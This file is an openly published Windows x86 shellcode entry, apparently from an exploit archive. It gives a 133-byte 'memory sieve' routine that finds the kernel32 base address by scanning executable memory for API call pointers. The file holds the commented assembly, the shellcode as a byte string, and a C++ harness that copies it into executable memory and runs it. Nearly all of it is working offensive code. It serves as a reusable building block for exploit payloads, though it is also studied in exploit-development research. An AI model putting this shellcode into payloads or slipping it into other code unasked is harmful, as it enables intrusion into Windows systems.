; Shellcode Title: Windows/x86 - Locate kernel32 base address / Memory Sieve method Shellcode (133 bytes)
; Description:
; This shellcode is a new method to find kernel32 base address by parsing .text section of memory to find a pointer to kernel32 API.
; Date: 1/26/2022
; Shellcode Author: Tarek Ahmed
; Tested on: Microsoft Windows 7, and 10

/*

MIT License

Copyright (c) 2022 Tarek Ahmed

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.


xor eax, eax
cdq

pop eax					; get the return address of .text section where the call of exec happened.
push eax
sub esp, 0x8 			; Reserve space on stack for variables
xor ecx, ecx
checkFirstByte:			; This will start finding the first two bytes of the instruction mov dword ptr[!!!]
inc ecx
mov  edx, dword ptr[eax+ecx]
cmp dl, 0xff
jne checkFirstByte
cmp byte ptr[eax+ecx+1], 0x15
jne checkFirstByte
jmp foundByte


foundByte:
	mov bl, byte ptr [eax+ecx+5]
	cmp bl, 0 			; make sure we don't step on next instruction
	je foundPtr
	jmp checkFirstByte

foundPtr:
	xor ebx, ebx
	mov ebx, dword ptr[eax + ecx + 2]
	mov edi, [ebx]
	shr edi, 28 			; We found pointer to an api, check if it start with 7 e.g. 0x7000000
	cmp edi, 7
	je foundPossibleAddr 	; If it starts with 7, then we have a possible kernel32 address
	jmp checkFirstByte


foundPossibleAddr:
	mov ebx, [ebx]
	xor edx, edx
	mov dx, 0x1001
	add edx, 0xefff

findMZ:
	sub ebx, edx 			; we need to subtract 0x10000 to get the base
	mov bx, dx

	mov ax, [ebx]
	cmp ax, 0x5a4d			; Check if it's a PE file which starts with "MZ"
	jne findMZ 				; If not, then subtract 0x10000 again to go one more page down.

	mov edi, [ebx + 0x3c]	; Finally we found a possible DLL file, we need to parse it now.
	add edi, ebx
	mov edi, [edi + 0x78]
	add edi, ebx
	mov edi, [edi + 0xc]
	add edi, ebx
	add edi, 4

	xor eax, eax
	push eax
	push 0x6c6c642e 		; .dll
	push 0x32334c45			; ELE32
	mov esi, esp			; We don't need the whole name, just ELE32.dll

checkKernel :
	mov edx, ecx
	mov ecx, 8
	cld

	repe cmpsb
	cmp ecx, 0
	jne checkFirstByte		; If we pass this check then we found our kernel32 base


*/

#include <windows.h>
#include <iostream>
#include <stdlib.h>
#include <stdio.h>


unsigned char code[] = "\x31\xC0\x99\x58\x50\x83\xEC\x08\x31\xC9\x41\x8B\x14\x08\x80\xFA\xFF\x75\xF7\x80\x7C\x08\x01\x15\x75\xF0\xEB\x00\x8A\x5C\x08\x05\x80\xFB\x00\x74\x02\xEB\xE3\x31\xDB\x8B\x5C\x08\x02\x8B\x3B\xC1\xEF\x1C\x83\xFF\x07\x74\x02\xEB\xD1\x8B\x1B\x31\xD2\x66\xBA\x01\x10\x81\xC2\xFF\xEF\x00\x00\x29\xD3\x66\x89\xD3\x66\x8B\x03\x66\x3D\x4D\x5A\x75\xF2\x8B\x7B\x3C\x01\xDF\x8B\x7F\x78\x01\xDF\x8B\x7F\x0C\x01\xDF\x83\xC7\x04\x31\xC0\x50\x68\x2E\x64\x6C\x6C\x68\x45\x4C\x33\x32\x89\xE6\x89\xCA\xB9\x08\x00\x00\x00\xFC\xF3\xA6\x83\xF9\x00\x75\x85";

int main()
{


	void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, code, sizeof(code));
	((void(*)())exec)();

	return 0;




}